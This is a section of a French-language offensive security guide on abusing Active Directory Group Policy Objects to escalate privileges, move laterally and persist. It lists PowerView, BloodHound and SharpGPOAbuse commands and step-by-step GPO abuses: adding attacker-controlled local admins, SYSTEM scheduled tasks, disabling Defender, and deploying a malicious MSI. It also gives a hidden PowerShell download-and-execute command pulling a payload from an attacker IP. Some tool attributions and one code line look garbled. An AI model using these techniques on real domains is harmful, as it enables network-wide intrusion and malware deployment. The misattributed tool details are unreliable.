# V.F. Abus des Politiques de Groupe (GPO)

Les Politiques de Groupe (GPO) sont un mécanisme puissant pour gérer la configuration des utilisateurs et des ordinateurs dans un environnement Active Directory. Si un attaquant obtient des droits de modification sur un GPO, il peut l'utiliser pour élever ses privilèges, se déplacer latéralement, ou établir une persistance.

## 1. Identification des GPOs Modifiables

*   **Objectif :** Trouver les GPOs sur lesquels l'utilisateur compromis (ou les groupes auxquels il appartient) a des droits d'écriture (`WriteDacl`, `WriteProperty`, `GenericAll`).
*   **Outils et Commandes :**
    *   **PowerView :**
        ```powershell
        # Lister les GPOs où l'utilisateur actuel a des droits de modification
        Find-InterestingDomainGpoAcl -ResolveGUIDs | ?{$_.IdentityReference -match $env:USERNAME}
        # Lister les GPOs où un groupe spécifique (ex: 'Utilisateurs du Domaine') a des droits de modification
        Find-InterestingDomainGpoAcl -ResolveGUIDs | ?{$_.IdentityReference -match "Utilisateurs du Domaine"}

        # Obtenir les ACLs d'un GPO spécifique par son nom (DisplayName)
        Get-ObjectAcl -ResolveGUIDs -DisplayName "Nom GPO Cible"
        # Ou par son GUID
        Get-ObjectAcl -ResolveGUIDs -ADSPath "LDAP://CN={GUID_GPO},CN=Policies,CN=System,DC=domaine,DC=local"
        ```
    *   **Module ActiveDirectory PowerShell :**
        ```powershell
        # Nécessite le module GroupPolicy et ActiveDirectory
        Import-Module GroupPolicy
        # Obtenir un GPO par nom
        $gpo = Get-GPO -Name "Nom GPO Cible"
        (Get-Acl "AD:CN=$($gpo.Id),CN=Policies,CN=System,$((Get-ADDomain).DistinguishedName)}").Access | Format-Table
        ```
    *   **BloodHound :**
        SharpHound collecte les ACLs des GPOs. BloodHound peut afficher les chemins d'attaque impliquant des droits de modification de GPO.
        Requête Cypher exemple : `MATCH p=(u:User)-[:WriteGPO|GenericAllGPO*1..]->(gpo:GPO) RETURN p`

## 2. Scénarios d'Abus de GPO

Une fois qu'un GPO modifiable est identifié, et en comprenant à quelles OUs (et donc à quels utilisateurs/ordinateurs) il est lié, plusieurs abus sont possibles :

### a. Ajout d'un Administrateur Local

*   **Principe :** Modifier le GPO pour ajouter un utilisateur (contrôlé par l'attaquant) au groupe Administrateurs local sur les machines affectées par le GPO.
*   **Méthode :**
    1.  Utiliser la console "Gestion des stratégies de groupe" (GPMC.msc) si un accès RDP/interactif à un poste avec les outils RSAT est possible.
    2.  Naviguer vers : `Configuration ordinateur` > `Stratégies` > `Paramètres Windows` > `Paramètres de sécurité` > `Groupes restreints`.
    3.  Ajouter une nouvelle entrée :
        *   Groupe : `Administrators` (ou `Administrateurs`)
        *   Membres de ce groupe : Ajouter `DOMAINE\UtilisateurAttaquant`
    4.  Alternativement, utiliser `Configuration ordinateur` > `Préférences` > `Paramètres du Panneau de configuration` > `Utilisateurs et groupes locaux`. Créer un nouvel "Groupe local" :
        *   Action : `Mettre à jour`
        *   Nom du groupe : `Administrators (intégrés)`
        *   Membres : Ajouter `DOMAINE\UtilisateurAttaquant` (cocher "Supprimer tous les membres existants" avec prudence).
*   **Impact :** L'attaquant devient admin local sur toutes les machines où le GPO s'applique.

### b. Exécution de Code via Tâche Planifiée Immédiate

*   **Principe :** Configurer le GPO pour créer une tâche planifiée qui s'exécute immédiatement (ou au prochain démarrage/connexion) avec les privilèges SYSTEM.
*   **Méthode (GPMC.msc) :**
    1.  Naviguer vers : `Configuration ordinateur` > `Préférences` > `Paramètres du Panneau de configuration` > `Tâches planifiées`.
    2.  Créer une nouvelle "Tâche immédiate (Windows Vista et ultérieur)".
    3.  Configurer :
        *   Nom : `MaTacheMalveillante`
        *   Exécuter en tant que : `NT AUTHORITY\System` (ou `AUTORITE NT\System`)
        *   Cocher "Exécuter avec les autorisations maximales".
        *   Onglet "Actions" : Nouvelle action > Démarrer un programme.
            *   Programme/script : `powershell.exe`
            *   Arguments : `-nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://<IP_ATTAQUANT>/payload.ps1')"` (ou une commande pour un reverse shell).
*   **Impact :** Exécution de code en tant que SYSTEM sur les machines cibles.

### c. Modification des Paramètres de Sécurité

*   **Principe :** Désactiver des protections, modifier les configurations du pare-feu, etc.
*   **Exemples :**
    *   Désactiver Windows Defender.
    *   Autoriser WinRM sur toutes les machines.
    *   Modifier les droits d'accès aux partages.

### d. Déploiement de Logiciels

*   **Principe :** Utiliser la fonctionnalité de déploiement de logiciels par GPO pour installer un MSI malveillant.
*   **Méthode (GPMC.msc) :**
    1.  Naviguer vers : `Configuration ordinateur` > `Stratégies` > `Paramètres du logiciel` > `Installation de logiciel`.
    2.  Nouveau > Paquet...
    3.  Pointer vers un MSI malveillant stocké sur un partage accessible par les machines cibles (ex: SYSVOL, ou un partage anonyme).
*   **Impact :** Installation du malware sur les machines cibles.

### e. Scripts de Démarrage/Arrêt/Connexion/Déconnexion

*   **Principe :** Ajouter un script malveillant qui s'exécutera au démarrage/arrêt de l'ordinateur ou à la connexion/déconnexion de l'utilisateur.
*   **Méthode (GPMC.msc) :**
    *   `Configuration ordinateur` > `Stratégies` > `Paramètres Windows` > `Scripts (démarrage/arrêt)`
    *   `Configuration utilisateur` > `Stratégies` > `Paramètres Windows` > `Scripts (ouverture/fermeture de session)`
    *   Placer le script malveillant dans le dossier SYSVOL du GPO (ex: `\\<DOMAINE>\SYSVOL\<DOMAINE>\Policies\{GUID_GPO}\Machine\Scripts\Startup` ou `User\Scripts\Logon`).

## 3. Modification des Fichiers GPO dans SYSVOL

*   Si l'attaquant a des droits d'écriture directement sur les fichiers du GPO dans le partage SYSVOL (ex: `\\<DOMAINE>\SYSVOL\<DOMAINE>\Policies\{GUID_GPO}\`), il peut modifier les fichiers de configuration (scripts, `.inf` pour les paramètres de sécurité, `.xml` pour les préférences) manuellement.
*   **Attention :** Cela peut être plus complexe et risqué si la structure des fichiers n'est pas bien comprise. La modification via GPMC est généralement plus sûre.
*   L'outil `grouper.py` (de BloodHound/SharpHound) peut aider à analyser les fichiers GPO.

## 4. Outils d'Automatisation
*   **PowerSploit `PowerUpSQL` et `Invoke-GPOMAudit` (plus ancien) / `Get-GPO` et `Set-GPO` (natif) :** Pour interagir avec les GPOs via PowerShell.
*   **SharpGPOAbuse (C#) :** Outil pour automatiser certains abus de GPO (ajout d'admin local, tâche planifiée).
    ```powershell
    # Exemple avec SharpGPOAbuse pour ajouter un utilisateur à un groupe local via GPO
    SharpGPOAbuse.exe --AddLocalAdmin --UserAccount "DOMAINE\UtilisateurAttaquant" --GPOName "Nom GPO Cible"
    # Exemple pour une tâche planifiée
    SharpGPOAbuse.exe --AddTask --TaskName "MaTache" --Author "AUTORITE NT\System" --Command "powershell.exe" --Arguments "-enc <BASE64_POWERSHELL_PAYLOAD>" --GPOName "Nom GPO Cible"
    ```

## Considérations
*   Les modifications de GPO peuvent prendre du temps à se propager (cycle de rafraîchissement des GPOs, par défaut 90-120 minutes, ou au redémarrage/reconnexion). Forcer une mise à jour avec `gpupdate /force` sur une machine cible (si on y a accès).
*   Les abus de GPO sont très bruyants si des audits sont en place.
*   Toujours sauvegarder ou noter la configuration originale d'un GPO avant de le modifier.
*   Tester les modifications dans un environnement de laboratoire si possible. 